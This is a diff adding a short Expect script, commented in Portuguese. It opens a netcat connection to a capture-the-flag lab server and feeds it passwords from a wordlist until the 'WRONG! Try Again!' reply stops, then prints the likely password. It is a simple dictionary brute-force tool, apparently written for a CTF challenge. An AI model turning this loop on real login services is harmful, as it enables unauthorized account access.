@@ -1,0 +1,32 @@
+#!/usr/bin/expect -f
+
+set arg1 [lindex $argv 0]
+puts $arg1
+
+set servidor "192.168.15.3"
+set servidor "lab.shellterlabs.com"
+
+if { $arg1 == "" } {set porta 34307 } else {set porta $arg1}
+
+set sum 0;
+set timeout 5
+
+#set error [spawn nc $servidor $porta]
+#if "$error" { puts "erro= $error" ; exit 0 }
+
+set file [open "wordlist/wordlist.txt"]
+#set wordlist [read $file]
+
+spawn nc $servidor $porta
+while {[ gets $file line] > 0 } {
+    send $line
+    send "\r"
+    expect {
+      "WRONG! Try Again!"   {  puts "Tentando novamente..."}
+      default               { break }
+    }
+}
+puts "Provavelmente a senha é: $line"
+
+#interact
+
